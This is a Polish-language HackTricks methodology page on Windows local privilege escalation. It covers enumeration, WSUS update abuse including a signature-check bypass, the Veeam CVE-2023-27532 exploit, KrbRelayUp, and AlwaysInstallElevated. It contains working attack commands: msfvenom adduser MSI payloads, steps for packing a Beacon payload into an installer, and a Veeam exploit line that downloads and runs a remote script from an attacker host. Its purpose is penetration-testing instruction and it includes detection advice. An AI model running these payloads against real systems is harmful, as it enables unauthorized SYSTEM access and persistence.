# Eskalacja uprawnień lokalnych w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktyczny proces enumeracji opiera się również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu w Windows, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji na temat ACLs - DACLs/SACLs/ACEs znajdziesz na tej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** tę **stronę** i **wyenumeruj** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić wykorzystanie edycji UEFI NVRAM w trybie offline do uzyskania dostępu DMA przed rozruchem, a następnie przeprowadzenie łańcucha ataku polegającego na modyfikacji pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / ciche podnoszenie uprawnień UIAccess

Procesy UIAccess uruchomione przez `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez monitów, jeśli kontrole bezpiecznej ścieżki AppInfo zostaną ominięte. Dedykowany proces omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Można wykorzystać propagację rejestru dostępności Secure Desktop do wykonania dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

W nowszych kompilacjach Windows pojawiła się również ścieżka LPE wykorzystująca **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoft. Ta baza zawiera ponad 4,700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inwentaryzuje kompilację systemu operacyjnego, zainstalowane aktualizacje i wybrane potencjalne poprawki; przed uznaniem wyniku za właściwy sprawdź dokładny produkt i zastępujące aktualizacje.

W przypadku exploita lokalnego dla konkretnej wersji sprawdź **architekturę uruchomionego procesu** oraz architekturę systemu operacyjnego. W 64-bitowym Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, natomiast `%windir%\Sysnative` zapewnia temu procesowi dostęp do natywnego katalogu systemowego. Ten alias jest niedostępny dla procesu 64-bitowego. Kompilacja systemu lub potencjalny brak poprawki KB nie dowodzą, że można wykorzystać lukę; porównaj aktualną kompilację, zainstalowaną lub zastępującą aktualizację, architekturę procesu i wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na GitHubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś credential/Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Dowiedz się, jak włączyć tę funkcję: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) domyślnie zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub parametr `Start-Transcript -OutputDirectory` mogą przekierować pliki do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i ACL pliku: mogą się w niej znaleźć argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest wskazówką tylko wtedy, gdy jej treść ujawnia możliwe do wykorzystania konto o wyższych uprawnieniach, które może zalogować się w odpowiednim kontekście.

### Rejestrowanie modułów PowerShell

Zapisywane są szczegóły wykonania potoku PowerShell, w tym uruchomione polecenia, wywołania poleceń oraz fragmenty skryptów. Pełne szczegóły wykonania i wyniki poleceń mogą jednak nie zostać zarejestrowane.

Aby włączyć tę funkcję, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z dzienników PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowana jest pełna aktywność oraz pełna treść wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany podczas działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie całej aktywności w chwili wykonania pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia logowania Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Punkt końcowy WSUS używający HTTP jest wskazówką do dalszej analizy pod kątem przechwytywania metadanych aktualizacji. Możliwość wykorzystania zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić lub kontrolować jego ruch oraz od ustawień zaufania i instalowania aktualizacji na kliencie. Sam URL nie oznacza możliwości wykonania kodu. [Firma Microsoft zaleca używanie TLS dla metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpierw sprawdź, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ma wartość równą `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji lub instalacja z podwyższonymi uprawnieniami są możliwe. Gdy ma wartość `0`, ten konkretny skonfigurowany punkt końcowy WSUS nie jest wybierany przez tę zasadę.

Aby wykorzystać te vulnerabilities, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — to skrypty exploitów MiTM do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS bez SSL.

Przeczytaj badania tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo na tej luce polega exploit:

> Jeśli możemy modyfikować proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy uruchomić [PyWSUS](https://github.com/GoSecure/pywsus) lokalnie, aby przechwytywać własny ruch i uruchamiać kod z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy samopodpisany certyfikat dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno przez HTTP, jak i HTTPS. WSUS nie używa mechanizmów podobnych do HSTS do implementacji walidacji certyfikatu typu trust-on-first-use. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę lukę za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie serwera `WSUS Administrators` oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, która otrzyma zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a także [dokumentuje relację zaufania przy publikowaniu](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu do publikowania lokalnych treści. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że potencjalna aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to inne naruszenie granicy zaufania niż przechwytywanie połączenia HTTP WSUS: warunkiem wstępnym jest wystarczający dostęp do **procedur składowanych bazy WSUS (`SUSDB`)**, aby opublikować i zatwierdzić niestandardową aktualizację. Jedną z praktycznych dróg wejścia jest przekazanie uwierzytelnienia konta komputera WSUS upstream do osobnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, która przekazuje uwierzytelnienie klienta WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużywanie WSUS HTTP do przekazywania NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Utwórz, wskaż cel i zatwierdź aktualizację

Proces obsługi niestandardowych aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Ważne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapis fragmentów XML z wymaganiami wstępnymi, lokalizacją i rozszerzeniami | `spSaveXMLFragment` |
| Powiązanie skrótu treści z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyliczenie/utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i procedura obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL treści i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia, zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez wcześniejszego sprawdzenia, czy bajty zawierają tekst lub prawidłowy obraz ESD. W efekcie niezmieniony plik PE o nazwie np. `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji z wiersza poleceń. Jest to błąd pomylenia polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Etapowanie zgodne z BITS i automatyzacja

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Źródło musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany dla łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do etapowania zawartości. Minimalne wywołanie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nadzorowane wykonanie i ponawianie prób jako mechanizm trwałości

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc ponawianie prób może stać się mechanizmem trwałego, powtarzającego się wykonania; jest to łatwe do zauważenia, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i wzmacnianie zabezpieczeń

Przydatne punkty kontrolne po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wywołania `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputery).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` oraz `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą zawartości, zamiast ufać sufiksowi.
- Szukaj powtarzających się niepowodzeń/ponawiania instalacji Windows Update oraz uruchomienia PE lub nieoczekiwanej aktywności procesów potomnych/sieciowej w przypadku zawartości oznaczonej nazwami `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur aktualizacji niestandardowych.

## Automatyczne aktualizatory firm trzecich i IPC agentów (lokalne podniesienie uprawnień)

Wiele agentów korporacyjnych udostępnia powierzchnię IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację w serwerze atakującego, a aktualizator ufa nieuczciwemu głównemu CA lub stosuje słabe kontrole podpisującego, użytkownik lokalny może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi tworzenia kopii zapasowych na **TCP/9401**. [Poradnik Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy danych konfiguracji w obrębie sieci kopii zapasowych; osobny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać na adresie innym niż localhost, dlatego sprawdź jej faktyczny adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie kompletna weryfikacja poprawek.
- **Minimalne wersje z poprawką**: Veeam podaje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wersje zawierające poprawkę; wcześniejsze wersje są podatne. Sama czteroczłonowa wersja pliku nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów kompilacji. Przed uznaniem granicznej kompilacji za poprawioną zweryfikuj identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie wyzwól payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Przytoczony PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM przeprowadzi uwierzytelnienie, a przekazany principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zapisy LDAP zarówno RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje część tych ścieżek. Łańcuch RBCD wymaga odpowiedniej delegacji i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu klucza poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź rzeczywistą politykę kontrolera domeny (DC) dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [powiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie ma typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Routing zapory/OXID i zainstalowane aktualizacje również mogą zmienić wynik. Traktuj permissive policy lub pasujące ACL jako kandydatów do przeglądu; pasywne wyliczanie nie powinno wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może doprowadzić do uzyskania biletu komputera i — tylko jeśli to konto ma wymagane uprawnienia replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz w artykule [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość wynosi **0x1**), użytkownicy z dowolnym poziomem uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego potrzebny będzie dostęp do GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten poradnik, aby dowiedzieć się, jak utworzyć opakowanie MSI za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **wiersze poleceń**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit **nowy payload TCP dla Windows EXE** w lokalizacji `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację wybierz **`C:\privesc`**, zaznacz **place solution and project in the same directory**, a następnie kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do uwzględnienia). Kliknij **Add** i wybierz wygenerowany przed chwilą payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić też inne właściwości, takie jak **Author** i **Manufacturer**, aby zainstalowana aplikacja wyglądała bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony zaraz po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` **w tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **rejestrowane**, więc zwróć na nie uwagę

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto sprawdzić, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

